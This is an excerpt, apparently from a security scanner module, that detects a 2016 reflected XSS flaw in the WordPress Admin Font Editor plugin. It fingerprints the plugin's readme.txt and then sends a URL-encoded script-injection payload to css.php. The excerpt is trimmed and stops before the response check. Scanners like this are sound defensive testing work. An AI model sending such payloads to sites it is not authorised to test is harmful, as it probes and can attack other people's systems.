...
class Module(Scanner, Http_client):
    __info__ = {
        ...
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2016', 'cve', 'wordpress', 'xss', 'wp-plugin', 'admin-font-editor_project', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        path = '/wp-content/plugins/admin-font-editor/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Admin Font Editor',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-content/plugins/admin-font-editor/css.php?size=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
